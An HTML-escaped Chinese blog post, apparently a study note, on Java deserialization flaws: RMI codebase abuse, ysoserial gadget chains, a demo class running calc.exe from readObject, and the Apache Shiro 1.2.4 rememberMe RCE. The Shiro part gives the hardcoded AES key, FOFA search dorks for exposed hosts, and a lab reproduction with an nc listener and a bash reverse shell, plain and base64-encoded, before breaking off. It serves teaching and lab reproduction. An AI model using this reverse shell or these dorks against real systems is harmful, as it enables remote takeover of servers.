&lt;p&gt;在 RMI 中，我们是可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去&lt;br&gt;
 CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117164157276.png&#34; alt=&#34;image-20221117164157276&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以只有满足如下条件的 RMI 服务器才能被攻击： 安装并配置了 SecurityManager&lt;/p&gt;
&lt;p&gt;Java 版本低于 7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false&lt;/p&gt;
&lt;p&gt;我们只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 / RMIClient$Payload.class 即可。&lt;/p&gt;
&lt;p&gt;我们使用 SerializationDumper 查看这段序列化数据：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117170707850.png&#34; alt=&#34;image-20221117170707850&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。&lt;br&gt;
所以，即使我们没有 RMI 的客户端，只需要修改 classAnnotations 的值，就能控制 codebase，使其 指向攻击者的恶意网站。&lt;/p&gt;
&lt;p&gt;在序列化 Java 类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法  annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。&lt;/p&gt;
&lt;p&gt;我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容。&lt;/p&gt;
&lt;p&gt;Java 在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是  ObjectOutputStream ，开发者可以将任何内容写入这个 stream 中；反序列化时，会调用  readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。&lt;/p&gt;
&lt;p&gt;我们写入的字符串被放在 objectAnnotation 的位置。在反序列化时，我读取了这个字符串，并将其输出：，是在 writeobject 写入&lt;/p&gt;
&lt;p&gt;ysoserial 可以让用户根据自己选择的利用链，生成反 序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。&lt;/p&gt;
&lt;p&gt;利用链也叫 “gadget chains”，我们通常称为 gadget。如果你学过 PHP 反序列化漏洞，那么就可以将  gadget 理解为一种方法，它连接的是从触发位置开始到执行命令的位置结束&lt;/p&gt;
&lt;p&gt;ysoserial 大部分的 gadget 的参数就是一条命令，比如这里是 id 。生成好的 POC 发送给目标，如 果目标存在反序列化漏洞，并满足这个 gadget 对应的条件，则命令 id 将被执行&lt;/p&gt;
&lt;p&gt;用 ysoserial 可以很容 易地生成这个 gadget 对应的 POC：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &amp;quot;id&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;序列化和反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#序列化和反序列化&#34;&gt;#&lt;/a&gt; 序列化和反序列化&lt;/h3&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120161615273.png&#34; alt=&#34;image-20221120161615273&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;主要应用场景：&lt;/p&gt;
&lt;p&gt;1、持久化内存数据&lt;/p&gt;
&lt;p&gt;2、网络传输对象&lt;/p&gt;
&lt;p&gt;3、远程方法调用 (RMI)&lt;/p&gt;
&lt;p&gt;java 可以序列化成字节流，也可以序列化为 json 格式&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.*;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TestToFile&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Person obj= &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;wuya&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;666&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;filePath&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;D:/wuya.xxx&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectOutputStream&lt;/span&gt;  &lt;span class=&#34;variable&#34;&gt;outStream&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectOutputStream&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileOutputStream&lt;/span&gt;(filePath));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        outStream.writeObject(obj);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 反序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectInputStream&lt;/span&gt;  &lt;span class=&#34;variable&#34;&gt;inStream&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectInputStream&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileInputStream&lt;/span&gt;(filePath));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// readObject 方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;readObject&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Person)inStream.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;反序列化后：name=&amp;quot;&lt;/span&gt;+readObject.name +&lt;span class=&#34;string&#34;&gt;&amp;quot;,age=&amp;quot;&lt;/span&gt;+readObject.age);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120163923386.png&#34; alt=&#34;image-20221120163923386&#34;&gt;&lt;/p&gt;
&lt;p&gt;很明显，序列化后的字节流的开头为 aced&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvc2VyaWFsVE9DLmh0bWw=&#34;&gt;https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvcHJvdG9jb2wuaHRtbCNhMTAyNTg=&#34;&gt;https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;详细格式如上&lt;/p&gt;
&lt;p&gt;如果两个包不在一个路径下，需要引入依赖&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;序列化&lt;/p&gt;
&lt;p&gt;java.io.ObjectOutputStream.writeObject()&lt;/p&gt;
&lt;p&gt;反序列化&lt;/p&gt;
&lt;p&gt;java.io.ObjectInputStream.readObject()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果在序列化的时候 override 了 readobject，那么在反序列化的时候就不会再执行 OOI 的代码&lt;/p&gt;
&lt;p&gt;如果此时重写的代码中含有可控参数，那么会造成漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.Serializable;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;UnsafeClass&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Serializable&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; String name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//重写readObject()方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(java.io.ObjectInputStream in)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//执行默认的readObject()方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        in.defaultReadObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Runtime.getRuntime().exec(&lt;span class=&#34;string&#34;&gt;&amp;quot;calc.exe&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.*;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;UnsafeTest&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String args[])&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;UnsafeClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;Unsafe&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;UnsafeClass&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Unsafe.name = &lt;span class=&#34;string&#34;&gt;&amp;quot;hacked by wuya&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;fos&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileOutputStream&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;D:/wuya.yyy&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectOutputStream&lt;/span&gt;(fos);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        os.writeObject(Unsafe);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        os.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//从 反序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;FileInputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;fis&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileInputStream&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;D:/wuya.yyy&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectInputStream&lt;/span&gt;(fis);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;UnsafeClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;objectFromDisk&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (UnsafeClass) ois.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(objectFromDisk.name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ois.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么我们要利用这个漏洞，就需要找到一些重写了 readobject 的类，同时 readobject 类中可以接受参数：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package sun.reflect.annotation;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AnnotationInvocationHandler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;package javax.management;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BadAttributeValueExpException&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;shiro-124反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shiro-124反序列化&#34;&gt;#&lt;/a&gt; Shiro 1.2.4 反序列化&lt;/h3&gt;
&lt;p&gt;Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;rememberMe 生成过程：序列化→AES 加密→Base64 编码→生成 rememberMe 内容。&lt;/li&gt;
&lt;li&gt;服务端接收 Cookie 值时：检索 Cookie 中的 rememberMe 内容→Base64 解密→AES 解密 (加密密钥硬编码)→反序列化 (未做处理)。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Apache Shiro 默认使用了 CookieRememberMeManager，其处理 Cookie 的流程：得到 rememberMe 的 Cookie 值→Base64 解码→AES 解密→反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。&lt;/p&gt;
&lt;p&gt;关键因素：AES 的加密密钥在 Shiro 的 1.2.4 之前版本中使用的是硬编码：kPH+bIxk5D2deZiIxcaaaA==，只要找到密钥后就可以通过构造恶意的序列化对象进行编码，加密，然后作为 Cookie 加密发送，服务端接收后会解密并触发反序列化漏洞。在 1.2.4 之后，ASE 秘钥就不为默认了，需要获取到 Key 才可以进行渗透&lt;/p&gt;
&lt;p&gt;在不选择 remember-me 的时候该字段为 delete me，勾选后为刚刚加密的数据&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NoaXJvL0NWRS0yMDE2LTQ0Mzcv&#34;&gt;Vulhub - Docker-Compose file for vulnerability environment&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;登录过程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183841649.png&#34; alt=&#34;image-20221122183841649&#34;&gt;&lt;/p&gt;
&lt;p&gt;验证过程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183907917.png&#34; alt=&#34;image-20221122183907917&#34;&gt;&lt;/p&gt;
&lt;p&gt;JRMP 全称为 Java Remote Method Protocol，也就是 Java 远程方法协议&lt;/p&gt;
&lt;p&gt;利用方式 1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190553667.png&#34; alt=&#34;image-20221122190553667&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用方式 2&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190635789.png&#34; alt=&#34;image-20221122190635789&#34;&gt;&lt;/p&gt;
&lt;p&gt;漏洞特征&lt;/p&gt;
&lt;p&gt;set-cookie 是否存在 remeberMe=deleteMe&lt;/p&gt;
&lt;p&gt;fofa dork&lt;/p&gt;
&lt;p&gt;header= “rememberme=deleteMe” 、header= “shiroCookie”&lt;/p&gt;
&lt;p&gt;检测工具&lt;/p&gt;
&lt;p&gt;1、shiro_tool.jar 纯字符版&lt;/p&gt;
&lt;p&gt;2、ShiroExploitV2.51&lt;/p&gt;
&lt;p&gt;3、shiro_attack-v2.0.jar&lt;/p&gt;
&lt;p&gt;硬编码的 aeskey&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193315250.png&#34; alt=&#34;image-20221122193315250&#34;&gt;&lt;/p&gt;
&lt;p&gt;复现：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193640835.png&#34; alt=&#34;image-20221122193640835&#34;&gt;&lt;/p&gt;
&lt;p&gt;1. 攻击机监听 nc -lvvp 7777&lt;/p&gt;
&lt;p&gt;2. 生成 payload，并编码&lt;/p&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.142.132/7777 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;p&gt;工具：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=&#34;&gt;https://ares-x.com/tools/runtime-exec/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;p bash,-i=&#34;&#34;&gt;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|&lt;/p&gt;
&lt;p&gt;3. 攻击机连接 JRMP&lt;/p&gt;
